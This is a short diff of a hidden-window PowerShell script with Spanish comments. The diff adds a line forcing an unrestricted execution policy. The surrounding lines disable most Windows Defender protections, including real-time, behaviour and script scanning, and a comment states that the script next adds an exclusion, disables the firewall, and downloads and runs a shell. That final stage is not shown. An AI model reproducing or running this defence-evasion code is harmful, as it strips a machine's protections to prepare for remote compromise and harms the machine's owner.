@@ -1,5 +1,6 @@
 PowerShell.exe -WindowStyle hidden {
 
+    Set-ExecutionPolicy unrestricted -Force
     # Desactivar Monitorización de Windows Defender (no 100%).
     Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -EnableControlledFolderAccess Disabled;
     # Agregar exclusion, desactivar Firewall, descargar y ejecutar shell.
